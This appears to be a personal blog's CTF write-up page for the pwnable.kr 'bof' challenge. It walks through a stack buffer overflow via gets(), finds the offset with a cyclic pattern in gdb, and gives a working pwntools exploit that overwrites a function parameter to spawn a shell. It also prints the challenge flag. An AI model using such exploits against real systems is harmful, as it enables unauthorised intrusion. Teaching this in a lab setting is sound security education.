@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="Detailed pwnable.kr bof challenge writeup, covering classic stack buffer overflow exploitation with parameter overwriting." />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: bof Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="canonical" href="https://www.yaelshechter.com/pwnable-bof.html" />
+
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "TechArticle",
+            "headline": "pwnable.kr bof Writeup - Classic Stack Buffer Overflow",
+            "author": {
+                "@type": "Person",
+                "name": "Yael Shechter",
+                "url": "https://yaelshechter.github.io/"
+            },
+            "datePublished": "2026-02-06",
+            "dateModified": "2026-02-06",
+            "keywords": ["pwnable.kr", "bof", "binary exploitation", "buffer overflow", "CTF writeup"],
+            "url": "https://yaelshechter.github.io/pwnable-bof.html"
+        }
+    </script>
+
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        .back-link::before {
+            content: '← ';
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
+        }
+
+        .meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 16px;
+        }
+
+        .tag {
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .banner{
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 16px;
+            margin: 16px 0 24px;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            width: 100%;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
+        }
+
+        article p {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul, article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
+        }
+
+        /* CSS for the Copy Button */
+        pre {
+            position: relative; /* Required for absolute positioning of the button */
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+            border: 1px solid #2d3748;
+            max-width: 100%;
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 4px 8px;
+            background: #2d3748;
+            color: #e2e8f0;
+            border: 1px solid #4a5568;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: 'DM Sans', sans-serif;
+            transition: all 0.2s;
+            opacity: 0; /* Hidden by default */
+        }
+
+        pre:hover .copy-button {
+            opacity: 1; /* Show on hover */
+        }
+
+        .copy-button:hover {
+            background: #4a5568;
+            color: white;
+        }
+
+        .copy-button.copied {
+            background: #48bb78;
+            border-color: #48bb78;
+            color: white;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #e2e8f0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
+        }
+
+        .meme-image {
+            width: 100%;
+            max-width: 460px;
+            display: block;
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
+        }
+    </style>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-88239B8JH3"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-88239B8JH3');
+    </script>
+</head>
+<body>
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: bof writeup</h1>
+        <div class="meta">
+            <span>📅 Nov 2025</span>
+            <span>🏆 5 points</span>
+            <span>📂 Toddler's Bottle</span>
+        </div>
+        <div class="tags">
+            <span class="tag">buffer-overflow</span>
+            <span class="tag">stack-canary</span>
+            <span class="tag">x86</span>
+            <span class="tag">pwntools</span>
+        </div>
+    </header>
+
+    <article>
+        <img src="images/pwnable-banner.png" alt="banner" class="banner" />
+
+        <h2>Challenge Description</h2>
+        <pre><code>Nana told me that buffer overflow is one of the most common software vulnerability.
+Is that true?
+ssh bof@pwnable.kr -p2222 (pw: guest)</code></pre>
+
+        <p>Connecting:</p>
+
+        <pre><code>ssh bof@pwnable.kr -p2222</code></pre>
+
+        <p>Running <code>ls</code> gives:</p>
+
+        <pre><code>bof  bof.c  readme</code></pre>
+
+        <p>The readme says:</p>
+
+        <pre><code>bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag</code></pre>
+
+        <h2>Reading the source code</h2>
+
+        <pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);       // smash me!
+	if(key == 0xcafebabe){
+		setregid(getegid(), getegid());
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}</code></pre>
+
+        <p>There is a stack buffer overflow in the <code>func</code> function. The buffer is 32 bytes, and the program uses the unsafe <code>gets()</code> function which doesn't check bounds. The goal is to overflow the buffer and overwrite the <code>key</code> parameter from <code>0xdeadbeef</code> to <code>0xcafebabe</code>.</p>
+
+        <p>Running <code>checksec --file=./bof</code> we see:</p>
+
+        <pre><code>    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No</code></pre>
+
+        <p>Interestingly, the stack canary is found, for the stack buffer overflows should be detected!</p>
+        <p>A stack canary is a random value that is placed on the stack before the return address. This string is checked before the flow returns to the calling code. This way, the program can detect if stack buffer overflow happened and crash the program with <code>stack smashing detected</code>.</p>
+        <p>Luckily, in this program we don't really need to deal with the stack canary at all - instead, the shell is called inside <code>func</code> before the function returns, so the canary check never happens.</p>
+
+        <h2>Finding the offset</h2>
+
+        <p>I used gdb with a cyclic pattern to find the exact offset:</p>
+
+        <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</code></pre>
+
+        <p>Setting a breakpoint at the comparison instruction:</p>
+
+        <pre><code>0x5655623c &lt;func+63&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</code></pre>
+
+        <p>The <code>key</code> parameter lives at <code>ebp+8</code> (standard x86 calling convention—parameters are pushed onto the stack above the saved base pointer). Examining the stack:</p>
+
+        <pre><code>0e:0038│ ebp 0xffffdba8 ◂— ...
+10:0040│+008 0xffffdbb0 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</code></pre>
+
+        <p>The pattern <code>naaa</code> appears at <code>ebp+8</code>, giving me the offset needed to overwrite the parameter.</p>
+
+        <h2>Exploitation</h2>
+
+        <pre><code class="language-python">from pwn import *
+offset = cyclic_find('naaa')
+payload = b'a' * offset
+payload += p32(0xcafebabe)
+conn = remote('pwnable.kr', 9000)
+conn.sendline(payload)
+conn.interactive()</code></pre>
+
+        <p>Running the exploit:</p>
+
+        <pre><code>python3 exploit.py
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ whoami
+bof_pwn
+$ ls
+bof
+bof.c
+flag
+log
+super.pl
+$ cat flag
+Daddy_I_just_pwned_a_buff3r!</code></pre>
+
+        <p>Yay :)</p>
+
+    </article>
+</div>
+
+<script>
+    document.querySelectorAll('pre').forEach((codeBlock) => {
+        // Create the button
+        const button = document.createElement('button');
+        button.className = 'copy-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        // Append button to the pre element
+        codeBlock.appendChild(button);
+
+        button.addEventListener('click', () => {
+            // Get the text from the <code> tag inside the <pre>
+            const code = codeBlock.querySelector('code').innerText;
+
+            navigator.clipboard.writeText(code).then(() => {
+                button.innerText = 'Copied!';
+                button.classList.add('copied');
+
+                // Reset button after 2 seconds
+                setTimeout(() => {
+                    button.innerText = 'Copy';
+                    button.classList.remove('copied');
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+            });
+        });
+    });
+</script>
+
+</body>
+</html>
